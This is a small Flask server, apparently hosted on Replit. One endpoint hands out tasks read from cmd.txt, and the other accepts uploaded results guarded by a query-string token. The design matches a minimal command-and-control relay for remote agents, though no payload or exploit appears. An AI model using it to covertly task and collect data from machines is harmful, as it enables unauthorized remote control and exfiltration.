from flask import Flask, request
import os

app = Flask(__name__)
SECRET = os.getenv("TOKEN")  # Set in Replit "Secrets"

@app.route('/cmd')
def cmd():
    if os.path.exists('cmd.txt'):
        return open('cmd.txt').read()
    return '{"task":"idle"}'

@app.route('/upload', methods=['POST'])
def upload():
    if request.args.get('token') == SECRET:
        with open('output.txt', 'w') as f:
            f.write(request.get_data(as_text=True))
        return "OK"
    return "DENIED", 403

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
